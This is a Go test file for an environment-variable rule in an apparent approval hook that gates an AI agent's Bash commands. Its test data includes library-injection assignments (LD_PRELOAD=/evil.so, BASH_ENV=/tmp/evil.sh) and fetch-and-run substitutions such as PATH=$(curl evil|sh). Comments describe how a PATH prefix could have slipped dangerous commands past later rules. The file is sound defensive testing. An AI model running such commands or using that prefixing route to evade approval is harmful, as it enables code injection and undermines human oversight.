package envvars

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

// fakeEvaluator lets the value-recursion path be exercised in isolation: it
// returns a verdict keyed on the recursed body so a test can assert the env-var
// rule INHERITS the inner command's verdict (pg2-gkd5e value-recursion).
type fakeEvaluator struct {
	verdicts map[string]hookio.Decision
}

func (f *fakeEvaluator) EvaluateExpression(expr string, _ []hookio.StackFrame, _ *hookio.HookInput) hookio.RuleResult {
	d, ok := f.verdicts[expr]
	if !ok {
		d = hookio.Approve
	}
	return hookio.RuleResult{Decision: d, Module: "fake"}
}

// EvaluateStructure satisfies hookio.Evaluator's I13 structural delegate
// method (pg2-m1i6r). No envvars test exercises structural delegation yet —
// the envvars rule itself is not migrated by that bead — so this simply
// reuses the same expr-keyed lookup EvaluateExpression already provides.
func (f *fakeEvaluator) EvaluateStructure(source string, leaves any, _ []hookio.StackFrame, _ *hookio.HookInput) hookio.RuleResult {
	return f.EvaluateExpression(source, nil, nil)
}

// TestEnvVars_Injectors_Reject: setting a guaranteed-unsafe linker/startup
// injector is DECISIVELY rejected regardless of value or position (pg2-gkd5e).
// Covers the leading, `export`, and `env`-prefix forms plus a BASH_FUNC_* name.
//
// `ENV=/evil.sh echo hi` was a row here until pg2-5jj3m. It is no longer a Reject —
// ENV's name collides with an ordinary project variable, so it moved to a decisive
// Ask (see injectorAskVars and TestEnvVars_ENV_DecisiveAsk, which pins every ENV
// shape including this one). BASH_ENV deliberately stays.
func TestEnvVars_Injectors_Reject(t *testing.T) {
	r := New()
	commands := []string{
		"LD_PRELOAD=/evil.so git status",
		"DYLD_INSERT_LIBRARIES=/evil.dylib ls",
		"LD_LIBRARY_PATH=/evil git log",
		"DYLD_LIBRARY_PATH=/evil git log",
		"BASH_ENV=/evil.sh echo hi",
		"ZDOTDIR=/evil echo hi",
		"BASH_FUNC_foo=bar echo hi",
		"export LD_PRELOAD=/evil.so",
		"export LD_PRELOAD=/evil.so && git status",
		"env LD_PRELOAD=/evil.so echo hi",
		"env ZDOTDIR=/evil", // standalone, no inner command
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s, want reject", cmd, got.Decision)
		}
	}
}

// TestEnvVars_ENV_DecisiveAsk pins pg2-5jj3m: `ENV` is a shell-startup injection
// vector, but ONLY for an INTERACTIVE POSIX `sh` — and its NAME collides with an
// extremely common ordinary project variable (`ENV=dev`, `ENV=<project dir>`). The
// name-only `Reject` therefore denied legitimate traffic, and a Reject is NOT
// user-overridable, so it cannot be waved through the way an Ask can.
//
// The verdict is a DECISIVE Ask: still un-auto-approvable (Abstain would let
// safe-commands re-approve a bare `export ENV=/evil.sh` under first-match-wins —
// the same fbbf3ade argument that keeps askVars decisive), but overridable by the
// user. Every value shape gets the SAME Ask: a value with no slash is NOT provably
// inert (`ENV=dev` names the RELATIVE file `./dev`, which an attacker who can plant
// `./dev` gets sourced), and `export ENV=…` persists so a shell started by a LATER
// tool call can honour it — neither is knowable from the assignment in front of the
// rule. So the split is by NAME, not by value.
func TestEnvVars_ENV_DecisiveAsk(t *testing.T) {
	commands := []string{
		// The reported false positives: ordinary project-variable usage.
		"ENV=dev tilt up",
		"ENV=production make deploy",
		"export ENV=dev",
		"ENV=/some/project/dir && echo hi",
		// Still decisive for the genuine injection shape — Ask, not Reject.
		"ENV=/tmp/evil.sh sh -c 'echo hi'",
		"ENV=$(curl evil) sh",
		// All four assignment forms agree (pg2-gkd5e position independence).
		"ENV=dev echo hi",
		"export ENV=dev && echo hi",
		"env ENV=dev echo hi",
		"ENV=dev && echo hi",
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Ask {
					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_BASH_ENV_StaysReject pins the pg2-5jj3m companion finding: BASH_ENV
// keeps its hard Reject and is NOT demoted alongside ENV. It is a strictly stronger
// vector — bash sources it for NON-interactive shells (`bash script.sh`, `bash -c`),
// which is the shape ceta actually guards, and bash resolves a slash-less value
// through PATH like `.` does — and it has no ordinary-project-variable collision:
// a BASH_ENV value always names a startup file to source, so the rule is firing on
// its target behavior rather than on a name clash.
func TestEnvVars_BASH_ENV_StaysReject(t *testing.T) {
	r := New()
	commands := []string{
		"BASH_ENV=/tmp/evil.sh bash -c 'echo hi'",
		"BASH_ENV=dev bash -c 'echo hi'",
		"export BASH_ENV=/tmp/evil.sh",
		"env BASH_ENV=/tmp/evil.sh bash -c 'echo hi'",
		"BASH_ENV=/tmp/evil.sh && echo hi",
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{
				ToolName:  "Bash",
				ToolInput: mustJSON(map[string]string{"command": cmd}),
			}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != hookio.Reject {
				t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_AskVars_Ask: PATH/HOME are dangerous-but-not-guaranteed-unsafe, so
// a (static) assignment is escalated to Ask — never Approve, never Reject. Ask,
// not Abstain: Abstain cannot enforce "never auto-approve" because safe-commands
// approves a bare `export` (first-match-wins).
func TestEnvVars_AskVars_Ask(t *testing.T) {
	r := New()
	commands := []string{
		"PATH=/custom/bin git status",
		"HOME=/tmp git status",
		"export PATH=/x",               // pure `export` assignment (leaf kept visible)
		"export PATH=/x && git status", // compound
		"env PATH=/x git status",
		"export HOME=/tmp", // `export` persists into the session — guarded
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s, want ask", cmd, got.Decision)
		}
	}
}

// TestEnvVars_AskVars_PreserveForm_Approve pins the pg2-0q99a value-aware split:
// an askVar assignment whose VALUE demonstrably PRESERVES the caller's own value
// ($PATH / ${PATH}, resp. $HOME) and whose every other `:`-separated component is
// a STATIC ABSOLUTE path is affirmatively safe, so it Approves instead of asking.
// The corpus has 984 such prompts and zero true positives; the dominant idiom is
// `export PATH="$PATH:/Volumes/ziprecruiter/pristine/bin"` (159 rows).
//
// The split is a pure NAME/VALUE decision: it MUST reach the same verdict with no
// evaluator wired (New()) as with one, so both constructors are exercised.
func TestEnvVars_AskVars_PreserveForm_Approve(t *testing.T) {
	commands := []string{
		`export PATH="$PATH:/Volumes/ziprecruiter/pristine/bin"`,  // the dominant real idiom
		`export PATH="/nix/store/abc123-golangci-lint/bin:$PATH"`, // nix-store prepend
		`export PATH="${PATH}:/opt/homebrew/bin"`,                 // brace form
		`export PATH=$PATH:/x`,                                    // unquoted
		`export PATH="/a/bin:$PATH:/b/bin"`,                       // prepend AND append
		`env PATH="$PATH:/x"`,                                     // env-prefix, no inner command
		`export HOME="$HOME"`,                                     // degenerate no-op preserve
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Approve {
					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_InCommandAssignedVar_Approve pins pg2-qhhil's narrow middle option:
// a PATH/HOME component that is not itself a static absolute path may still
// Approve when it names a variable THIS SAME COMMAND assigned, earlier, to one —
// wiring the pg2-wq3ki InCommandVars/ExpandInCommand seam into preservesCallerValue.
// These are the corpus's own measured shapes (pg2-3arc2, 2026-08-17: 23 of 74
// post-apply PATH/HOME asks, 0 denials): a scratch/build directory captured into a
// variable earlier in the command, then prepended or appended onto PATH.
//
// Every case here is a DIRECT (non-engine) call, so the rule's own reparse of the
// whole compound — and its own primarycommit.LeafVars computation over that
// reparse — is what is under test, matching the "direct caller" half of LeafVars'
// own doc comment.
func TestEnvVars_InCommandAssignedVar_Approve(t *testing.T) {
	commands := []string{
		`bindir=/tmp/x/bin; PATH="$bindir:$PATH"`,                              // the bead's own example, ';'
		`bindir=/tmp/x/bin && PATH="$bindir:$PATH"`,                            // '&&' separator
		`TEST_DIR=/tmp/bats-run; PATH="$TEST_DIR/bin:$PATH"`,                   // the bead's other example
		`TEST_DIR=/tmp/bats-run; PATH="${TEST_DIR}/bin:$PATH"`,                 // braced reference
		`export SP=/private/tmp/scratchpad && export PATH="$SP/bin:$PATH"`,     // export both halves
		`B=/tmp/x; D=/tmp/y; export PATH="$B/bin:$D/bin:/usr/local/bin:$PATH"`, // two in-command vars beside a static component
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Approve {
					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_InCommandAssignedVar_AmbientStaysAsk is the companion regression
// pg2-qhhil's Acceptance Criteria calls for by name: the narrow middle option MUST
// NOT widen into the blanket-widen shape it was deliberately carved out of. Every
// case here names a variable this seam CANNOT resolve — either because it is
// AMBIENT (never assigned by the command's own text: $PWD, $JAVA_HOME, $TMP), or
// because the in-command binding was revoked, was a different name, or was scoped
// out (prefix assignment) — so every one MUST still reach the decisive Ask, exactly
// as before this bead.
func TestEnvVars_InCommandAssignedVar_AmbientStaysAsk(t *testing.T) {
	commands := []string{
		// THE bead's own coherence example: $PWD is never assigned by the command,
		// so it must keep asking exactly like the empty-component case it mirrors.
		`export PATH="$PWD/bin:$PATH"`,
		`export PATH="$JAVA_HOME/bin:$PATH"`,
		`export PATH="$TMP:$PATH"`,
		// The referenced name is simply never assigned anywhere in this command.
		`PATH="$bindir:$PATH"`,
		// A DIFFERENT name was assigned; $bindir itself was not.
		`other=/tmp/x/bin; PATH="$bindir:$PATH"`,
		// The in-command literal binding is REVOKED by a later non-literal
		// reassignment of the SAME name (cmdparse.InCommandVars' revocation rule).
		`bindir=/tmp/x/bin; bindir=$(mktemp -d); PATH="$bindir:$PATH"`,
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Ask {
					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_SafeSubstitutionComponent_Approve pins pg2-kzqw2's relief: a
// PATH/HOME component that is not itself a static absolute path may still
// Approve when it is a certified-safe command substitution (cmdparse.
// IsSafeSubstitutionBody, e.g. `dirname`/`readlink`/`date`) plus an optional
// literal prefix/suffix — wiring the "Option 1" operator ruling (2026-08-17,
// via `/unblock-human-beads`) into preservesCallerValue.
//
// The `date +%H:%M` row is the specific proof that the split is
// SUBSTITUTION-BOUNDARY-AWARE rather than a naive `strings.Split(value, ":")`:
// the substitution's own body carries a literal ':', and a caller that split
// on ':' BEFORE recognizing the substitution's extent would shred it into
// garbage components that could never approve. It only approves if the colon
// inside `$(date +%H:%M)` is correctly treated as opaque.
func TestEnvVars_SafeSubstitutionComponent_Approve(t *testing.T) {
	commands := []string{
		`export PATH="$(dirname /usr/local/bin/go)/bin:$PATH"`,  // suffix after the substitution
		`export PATH="$PATH:$(dirname /usr/local/bin/go)/bin"`,  // append side
		"export PATH=\"`dirname /usr/local/bin/go`/bin:$PATH\"", // backtick form
		`export PATH="/opt/$(dirname /usr/local/bin/go):$PATH"`, // literal PREFIX, no suffix
		`export PATH="$(date +%H:%M)/bin:$PATH"`,                // embedded ':' inside the body
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Approve {
					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_SafeSubstitutionComponent_PositionIndependent re-asserts condition 3
// of the Rule contract (assignmentIsWholeLeaf) for pg2-kzqw2's relief: the SAME
// value shape must Approve identically across the four leaf forms
// assignmentIsWholeLeaf recognizes as "no command left to pre-empt" — bare
// (command-less), `export`, `env`, and the command-less leaf a compound
// (`;`/`&&`) split produces (pg2-mtnmb rule-visibility, pg2-gkd5e
// position-independence) — the same invariant TestEnvVars_AssignmentIsWholeLeaf
// pins structurally and TestEnvVars_LoneAssignment_RuleVisible_Pg2mtnmb pins for
// the pg2-0q99a shape. TestEnvVars_SafeSubstitutionComponent_Approve above only
// ever exercised the `export` form, so this closes that gap for the NEW relief
// specifically: a prefixed compound form's assignment-only leaf must reach the
// SAME verdict as the bare form standing alone ("prefixed == bare").
func TestEnvVars_SafeSubstitutionComponent_PositionIndependent(t *testing.T) {
	commands := []string{
		`PATH="$(dirname /usr/local/bin/go)/bin:$PATH"`,              // bare / command-less leaf
		`export PATH="$(dirname /usr/local/bin/go)/bin:$PATH"`,       // export form
		`env PATH="$(dirname /usr/local/bin/go)/bin:$PATH"`,          // env-prefix, no inner command
		`PATH="$(dirname /usr/local/bin/go)/bin:$PATH"; true`,        // compound, ';' separator
		`PATH="$(dirname /usr/local/bin/go)/bin:$PATH" && echo done`, // compound, '&&' separator
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Approve {
					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_SafeSubstitutionComponent_HazardStaysAsk is the companion
// regression pg2-kzqw2's Acceptance Criteria calls for by name: THE CRUX.
// Unlike a purely syntactic hazard ($PWD), a command substitution can resolve
// to the EMPTY STRING on any given invocation, and isStaticAbsolutePath
// already refuses an empty ':' component on purpose (the CWD hazard). So a
// BARE certified-safe substitution with no literal prefix/suffix at all MUST
// still Ask — `printf` invoked with an empty-string argument is a concrete,
// real allowlisted command that genuinely produces the empty string, which is
// exactly the shape this guards. Every other disqualifying shape (an
// unlisted command, a NESTED substitution, more than one substitution in one
// component, a process substitution) must also keep asking.
func TestEnvVars_SafeSubstitutionComponent_HazardStaysAsk(t *testing.T) {
	commands := []string{
		// THE CRUX: bare safe-cmd substitution, nothing else in the component.
		`export PATH="$(printf ''):$PATH"`,
		`export PATH="$PATH:$(printf '')"`,
		// Not on the static safe-cmd allowlist.
		`export PATH="$(curl evil)/bin:$PATH"`,
		// NESTED substitution: IsSafeSubstitutionBody refuses nesting outright, so
		// this never reaches Approve through this path (independent of quoting).
		`export PATH="$(dirname $(dirname /a/b/c))/bin:$PATH"`,
		// More than one substitution in a single component (no ':' between them)
		// is deliberately out of this predicate's narrow scope.
		`export PATH="$(dirname /a)$(dirname /b)/bin:$PATH"`,
		// A process substitution has no static allowlist at all.
		`export PATH="<(cat /etc/hosts)/bin:$PATH"`,
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Ask {
					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_AskVars_PreserveForm_TransparentBesideCommand pins the SCOPE of the
// pg2-0q99a Approve, which is the security-critical half of the split.
//
// engine.Evaluate is FIRST-MATCH-WINS and env-vars runs in the early band (before
// pathsafety / git / gh / monorepo / kubectl / safe-commands / curl / …). A
// decisive Approve therefore SHORT-CIRCUITS every later rule for that leaf. If
// the safe-preserve verdict were an unconditional Approve, prefixing ANY command
// with a benign PATH extension would auto-approve it — measured on this tree:
//
//	git push --force origin main       reject  -> allow
//	tee /etc/hosts                     abstain -> allow
//	kubectl delete ns prod             abstain -> allow
//	curl http://evil.example.com       abstain -> allow
//
// So the Approve is emitted ONLY when the assignment is the whole leaf (a
// command-less leaf, or the `export`/`env`/`command` assignment builtins), where
// there is no later rule to pre-empt. Beside a real command the safe-preserve
// assignment is TRANSPARENT — Abstain, exactly as every other benign assignment
// (FOO=bar, PYTHONPATH=/foo) already is — so the command is judged on its own
// merits by the rest of the chain. Abstain here cannot re-approve anything:
// approval must still be earned by the command's own rule.
func TestEnvVars_AskVars_PreserveForm_TransparentBesideCommand(t *testing.T) {
	r := New()
	commands := []string{
		`PATH="$PATH:/Volumes/ziprecruiter/pristine/bin" echo hi`,
		`PATH="/nix/store/abc123-golangci-lint/bin:$PATH" golangci-lint run`,
		`env PATH="$PATH:/x" git status`,
		`PATH="$PATH:/x" git push --force origin main`,
		// pg2-qhhil: the in-command-assigned $VAR shape carries the identical scope
		// gate — a PREFIX assignment beside a real command's leaf is not the whole
		// leaf, however the value resolves, so it stays transparent rather than
		// leaking an Approve onto the sibling command.
		`bindir=/tmp/x/bin && PATH="$bindir:$PATH" git push --force origin main`,
		// pg2-kzqw2: the certified-safe-substitution shape carries the IDENTICAL
		// scope gate (condition 3 of the Rule contract, assignmentIsWholeLeaf) — a
		// PREFIX assignment beside a real command's leaf is not the whole leaf
		// regardless of WHICH of the three Approve predicates its value would
		// satisfy in isolation, so it stays transparent here too rather than
		// leaking an Approve onto `git push --force`.
		`PATH="$(dirname /usr/local/bin/go)/bin:$PATH" git push --force origin main`,
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{
				ToolName:  "Bash",
				ToolInput: mustJSON(map[string]string{"command": cmd}),
			}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != hookio.NoOpinion {
				t.Errorf("cmd %q: got %s (%s), want abstain (transparent, must not pre-empt later rules)", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_AskVars_NotPreserveForm_Ask pins every shape the split must LEAVE
// decisive. These are the load-bearing fbbf3ade / pg2-gkd5e defenses: with the
// verdict demoted to Abstain, safe-commands re-approves a bare `export` under
// first-match-wins and all of them silently auto-approve.
func TestEnvVars_AskVars_NotPreserveForm_Ask(t *testing.T) {
	commands := []string{
		// --- REPLACEMENT: the caller's value is discarded. This is the shape a
		// PATH-hijack takes, and a hermetic test harness is textually identical to
		// one, so both correctly keep asking.
		`export PATH=/replaced`,
		`PATH=/replaced echo hi`,
		`export HOME=/tmp/fakehome`,
		`PATH="$CLEANPATH" echo hi`,
		`env -i HOME="$TD" ./run.sh`,
		`PATH=$(curl evil|sh) echo hi`,
		`PATH=$(mktemp -d) echo hi`, // a SafeCmd body is still a REPLACEMENT
		// --- PRESERVE form, but a component is not a static absolute path. The
		// predicate is deliberately STRICT: every added component must be static and
		// absolute, so nothing behind an expansion can smuggle a directory in.
		`PATH="$PATH:$(curl evil)" echo hi`, // sharpest edge: preserve + unclassifiable
		`export PATH="$PATH:$(curl evil)"`,
		`export PATH="$PATH:$(nix build --no-link --print-out-paths nixpkgs#uv)/bin"`,
		`PATH="$PATH:relative/dir" echo hi`, // not absolute
		`export PATH="$PATH:~/bin"`,         // tilde is not an absolute path
		`export PATH="$PATH:$HOME/bin"`,     // $VAR-derived component (strict predicate)
		`export PATH="$PWD/bin:$PATH"`,
		`export PATH="$PATH:"`, // empty component == implicit CWD in PATH
		`export PATH=":$PATH"`,
		// Single quotes make `$PATH` LITERAL, so this is a REPLACEMENT with a garbage
		// value, not a preserve — the value text alone is misleading.
		`export PATH='$PATH:/x'`,
		// Partially-quoted value: cannot be normalized to a component list safely.
		`export PATH="$PATH":/x`,
		// Bash append form (pg2-0q99a decision #3): `+=` intentionally keeps asking.
		// It IS semantically a preserve, but zero corpus rows use it, and excluding it
		// keeps the Approve as narrow as possible.
		`export PATH+=":/x"`,
		`export PATH+="$PATH:/x"`,
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{
					ToolName:  "Bash",
					ToolInput: mustJSON(map[string]string{"command": cmd}),
				}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Ask {
					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_HermeticEnvReplacement_Approve pins pg2-d71my's first relief: a
// PATH/HOME REPLACEMENT value is affirmatively safe when the leaf runs under
// `env -i`/`env --ignore-environment` (there is no caller value left to
// preserve) AND the value is static and reasonable — every `:`-separated
// component (or the whole value, for a non-list-shaped HOME) a literal
// absolute path. This relief is INDEPENDENT of the in-command $VAR dataflow
// pg2-qhhil wired in: no vars/tempDirVars are needed, only the leaf's own
// EnvCleared marker.
func TestEnvVars_HermeticEnvReplacement_Approve(t *testing.T) {
	commands := []string{
		"env -i PATH=/usr/bin:/bin",              // bare env -i query, PATH only
		"env -i HOME=/tmp",                       // bare env -i query, HOME only
		"env -i PATH=/usr/bin:/bin HOME=/tmp",    // both, the corpus's own idiom
		"env --ignore-environment PATH=/usr/bin", // long-flag spelling
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
			got := hookio.Verdict(New().Evaluate(input))
			if got.Decision != hookio.Approve {
				t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_HermeticEnvReplacement_TransparentBesideCommand is the env -i
// analogue of TestEnvVars_AskVars_PreserveForm_TransparentBesideCommand: beside
// a real command the leaf is not the WHOLE leaf (assignmentIsWholeLeaf), so the
// Approve must not surface and cannot pre-empt the command's own verdict —
// re-asserting the pg2-0q99a Rule contract's condition 3 for this new relief.
func TestEnvVars_HermeticEnvReplacement_TransparentBesideCommand(t *testing.T) {
	r := New()
	commands := []string{
		"env -i PATH=/usr/bin:/bin HOME=/tmp git status",
		"env -i PATH=/usr/bin:/bin HOME=/tmp git push --force origin main",
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != hookio.NoOpinion {
				t.Errorf("cmd %q: got %s (%s), want abstain (transparent, must not pre-empt later rules)", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_HermeticEnvReplacement_Ask pins the required regressions: this
// relief MUST NOT widen beyond "env -i AND static/reasonable value".
func TestEnvVars_HermeticEnvReplacement_Ask(t *testing.T) {
	commands := []string{
		// REQUIRED REGRESSION (bead AC): no hermetic marker at all — a bare
		// REPLACEMENT must keep asking exactly as before this bead.
		"export HOME=/replaced",
		"PATH=/replaced HOME=/replaced echo hi",
		// env -i present, but the value is NOT static/reasonable: it still
		// references an unresolvable variable, so it is textually
		// indistinguishable from a hijack even inside a cleared environment.
		`env -i HOME="$TD" ./run.sh`,
		`env -i PATH="$CLEANPATH" ./run.sh`,
		// env -i present, value has a non-absolute / relative component.
		"env -i PATH=relative/bin HOME=/tmp cmd",
		// env -i present, value carries a live expansion — not "static".
		"env -i PATH=/usr/bin:$(evil) HOME=/tmp cmd",
		"env -i HOME=$(curl evil|sh) cmd",
		// env -i present, empty PATH component (implicit CWD hazard).
		"env -i PATH=/usr/bin: HOME=/tmp cmd",
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
			got := hookio.Verdict(New().Evaluate(input))
			if got.Decision != hookio.Ask {
				t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_HermeticEnvReplacement_InjectorStillRejects pins the required
// regression that `env -i` does NOT sweep injector vars into any relief:
// LD_PRELOAD (and family) must still be a DECISIVE Reject regardless of the
// invocation being hermetic. isHermeticEnvReplacement is reached only from the
// askVars case, which the injector switch cases above it in evaluateAssignment
// already short-circuit — this test proves that structurally, not just by
// inspection.
func TestEnvVars_HermeticEnvReplacement_InjectorStillRejects(t *testing.T) {
	commands := []string{
		"env -i LD_PRELOAD=/evil.so PATH=/usr/bin:/bin HOME=/tmp cmd",
		"env -i DYLD_INSERT_LIBRARIES=/evil.dylib PATH=/usr/bin:/bin cmd",
		"env -i LD_PRELOAD=/evil.so",
		"env --ignore-environment LD_PRELOAD=/evil.so cmd",
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
			got := hookio.Verdict(New().Evaluate(input))
			if got.Decision != hookio.Reject {
				t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
			}
		})
	}
}

// TestEnvVars_HomeTempDir_Approve pins pg2-d71my's second relief: a HOME
// REPLACEMENT grounded in a `mktemp -d` fresh temporary directory — either
// DIRECTLY (`HOME=$(mktemp -d)`) or via a variable THIS SAME command bound to
// one earlier (`T=$(mktemp -d); ... HOME="$T/h"`), gated on the pg2-qhhil
// in-command dataflow seam (cmdparse.InCommandTempDirVars/ExpandInCommand).
func TestEnvVars_HomeTempDir_Approve(t *testing.T) {
	commands := []string{
		"HOME=$(mktemp -d)",                    // direct, $(...) form, bare
		"HOME=`mktemp -d`",                     // direct, backtick form, bare
		"HOME=$(mktemp --directory)",           // long-flag spelling
		`T=$(mktemp -d); HOME="$T/h"`,          // var-ref + literal suffix, leading
		`T=$(mktemp -d); export HOME="$T/h"`,   // var-ref + literal suffix, export
		`T=$(mktemp -d) && HOME=$T`,            // var-ref, no suffix, unquoted
		`T=$(mktemp -d); export HOME="${T}/h"`, // braced var-ref form
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Approve {
					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_HomeTempDir_TransparentBesideCommand re-asserts the pg2-0q99a
// Rule contract's condition 3 (assignmentIsWholeLeaf) for the temp-dir relief:
// beside a real command the leaf is not the whole leaf, so the Approve must
// stay transparent rather than pre-empting the command's own verdict.
func TestEnvVars_HomeTempDir_TransparentBesideCommand(t *testing.T) {
	r := New()
	commands := []string{
		"HOME=$(mktemp -d) git status",
		"HOME=$(mktemp -d) git push --force origin main",
		`T=$(mktemp -d); HOME="$T/h" git status`,
	}
	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != hookio.NoOpinion {
				t.Errorf("cmd %q: got %s (%s), want abstain (transparent, must not pre-empt later rules)", cmd, got.Decision, got.Reason)
			}
		})
	}
}

